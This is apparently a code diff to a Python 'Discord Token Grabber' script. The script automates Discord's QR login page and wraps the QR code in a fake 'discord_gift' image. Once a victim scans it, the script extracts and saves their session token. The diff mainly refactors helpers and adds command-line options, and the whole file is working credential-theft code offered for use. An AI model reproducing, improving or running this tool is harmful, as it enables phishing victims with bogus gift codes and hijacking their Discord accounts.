@@ -6,8 +6,10 @@ __license__ = "MIT"
 __repository__ = "https://github.com/hirusha-adi/Discord-Token-Grabber-by-QR"
 
 
+import argparse
 import os
 import time
+from datetime import datetime
 
 from loguru import logger
 from PIL import Image
@@ -15,11 +17,36 @@ from selenium import webdriver
 from selenium.webdriver.common.by import By
 import selenium.common.exceptions
 
-from dtg import utitlites
+
+@logger.catch
+def __print_logo_asciiart():
+    print(r"""
+        ____ _____ ____ 
+        |  _ \_   _/ ___|
+        | | | || || |  _ 
+        | |_| || || |_| |
+        |____/ |_| \____|
+      Discord Token Grabber
+         """)
 
 
 @logger.catch
-def logo_qr():
+def __save_to_file(result: str = None, save_file_name: str = None):
+    if result is None:
+        print("- Result not given!")
+
+    if save_file_name in os.listdir(os.getcwd()) == False:
+        with open(save_file_name, "w", encoding="utf-8") as filem:
+            filem.write(f"\n{datetime.now()} - {save_file_name} created!")
+            print(f"+ Created: {save_file_name}")
+
+    with open(save_file_name, "a", encoding="utf-8") as filew:
+        filew.write(f"\n{result}")
+        print(f"+ Added token to {save_file_name}")
+
+
+@logger.catch
+def __logo_qr():
     logger.debug("Pasting the overlay image onto the QR code.")
     im1 = Image.open(os.path.join('image', 'qr_code.png'), 'r')
     im2 = Image.open(os.path.join('image', 'overlay.png'), 'r')
@@ -30,7 +57,7 @@ def logo_qr():
 
 
 @logger.catch
-def paste_template():
+def __paste_template():
     logger.debug("Pasting the QR code onto the template.")
     im1 = Image.open(os.path.join('image', 'template.png'), 'r')
     im2 = Image.open(os.path.join('image', 'final_qr.png'), 'r')
@@ -40,7 +67,7 @@ def paste_template():
 
 
 @logger.catch
-def get_executable_path():
+def __get_executable_path():
     executable_path = ""
     if os.name == 'nt':
         current_dir_file = os.path.join(os.getcwd(), "chromedriver.exe")
@@ -66,15 +93,16 @@ def get_executable_path():
     return executable_path
 
 
+
 @logger.catch
-def main():
-    utitlites.show_logo()
+def grabToken(time_to_wait = 3, save_file_name = True):
+    __print_logo_asciiart()
     options = webdriver.ChromeOptions()
     options.add_experimental_option('excludeSwitches', ['enable-logging'])
     options.add_experimental_option('detach', True)
     logger.debug("Loaded the options for Chrome webdriver.")
 
-    executable_path = get_executable_path()
+    executable_path = __get_executable_path()
     logger.debug(f"Found chromedriver executable_path: {executable_path}")
 
     if executable_path is None:
@@ -94,11 +122,11 @@ def main():
     while True:
         try:
             image_element = driver.find_element(by=By.XPATH, value=f"//div[@class='qrCodeOverlay_ae8574']") # of type `selenium.webdriver.remote.webelement.WebElement`
-            time.sleep(3.5) # wait for image to load, else, results in empty gray space
+            time.sleep(time_to_wait) # wait for image to load, else, results in empty gray space
             original_qr_code_image = image_element.screenshot_as_png # of type `bytes`
             logger.success("Loaded discord login page.")
             break
-        except selenium.common.exceptions.NoSuchElementException:
+        except (selenium.common.exceptions.NoSuchElementException, selenium.common.exceptions.StaleElementReferenceException):
             logger.info("Page is still loading, retrying in 2 seconds...")
             time.sleep(2)
 
@@ -130,8 +158,8 @@ def main():
         logger.debug(f"Saved original QR code to: {file}")
 
     discord_login = driver.current_url
-    logo_qr()
-    paste_template()
+    __logo_qr()
+    __paste_template()
 
     logger.success('QR Code has been generated > ./discord_gift.png')
     logger.success('Send the QR Code to user and scan. Waiting...')
@@ -157,12 +185,31 @@ for (let e in req.c)
 return token;   
                 ''')
             logger.success(f'Token grabbed: {token}')
-            utitlites.save_results_to_file(str(token))
+            __save_to_file(result=str(token), save_file_name=save_file_name)
             logger.debug("Saved results to file")
             break
-
     logger.success('Task complete')
 
 
+@logger.catch
+def main():
+    parser = argparse.ArgumentParser(description='A script to grab data with various options.')
+    parser.add_argument('--verbose', action='store_true', default=False, help='Enable verbose output')
+    parser.add_argument('--logs', action='store_true', default=False, help='Enable logging')
+    parser.add_argument('--save', nargs='?', const='tokens.txt', default='tokens.txt', help='Specify the filename to save the data (default is tokens.txt)')
+    parser.add_argument('--time', type=int, default=4, help='Set the time (default is 4)')
+    args = parser.parse_args()
+
+    logger.level("INFO")
+    if args.verbose:
+        logger.level("DEBUG")
+
+    if args.logs:
+        logger.add("token-grabber.log", level="DEBUG")
+        pass
+    
+    grabToken(time_to_wait=args.time, save_file_name=args.save)
+
+    
 if __name__ == '__main__':
     main()
